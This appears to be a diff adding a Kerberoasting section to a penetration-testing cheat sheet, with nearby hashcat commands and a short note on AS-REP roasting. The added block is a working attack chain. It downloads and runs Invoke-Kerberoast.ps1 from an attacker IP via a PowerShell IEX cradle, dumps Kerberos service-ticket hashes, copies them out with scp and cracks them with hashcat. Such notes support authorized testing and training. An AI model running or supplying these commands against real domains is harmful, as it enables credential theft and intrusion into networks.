@@ -1194,6 +1194,16 @@ hashcat -m 13100 -a 0 ticket.john wordlist.txt
 hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
 hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
 ```
+##### KERBEROASTING - PAPUM
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/Invoke-Kerberoast.ps1")
+Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash
+Invoke-Kerberoast -OutputFormat HashCat |Select-Object -ExpandProperty hash | out-file -Encoding ASCII myhashes.txt 
+scp myhashes.txt kali@172.16.99.209:/tmp/
+hashcat -m 13100 /tmp/hash1.txt -a 0 10k-worst-pass.txt
+hashcat -m 13100 /tmp/hash1.txt -a 0 10k-worst-pass.txt --show
+```
+
 ## KERBEROASTING-ASREP
 AS-REPS roasting is a technique in which the password can be retrieved because the 'Do not require Kerberos preauthentication property' is enabled, or kerberos preauthentication is disabled. An attacker can skip the first step of authentication and request a TGT for this user, which can then be cracked offline.
 
